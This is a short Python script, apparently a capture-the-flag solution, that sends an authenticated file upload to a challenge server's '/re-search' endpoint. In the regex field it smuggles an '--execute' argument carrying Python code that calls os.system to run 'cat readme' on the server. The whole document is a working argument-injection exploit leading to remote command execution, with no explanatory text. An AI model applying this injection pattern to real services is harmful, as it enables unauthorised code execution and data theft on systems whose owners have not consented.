import requests
import base64
password = "good job! can you also exploit this tool?"
auth = base64.b64encode('user:' + password)
s_files = {'file': ('abc.den', open('input0.txt', 'rb'), 'application/vnd.ms-excel', {'Expires': '0'})}
res =  requests.post('http://d1d13r.stillhackinganyway.nl:9002/re-search', files = s_files, headers = {'Authorization': 'Basic ' + auth}, data = {'regex':
 "--execute=__import__('os').system('cat readme')"})
print res.text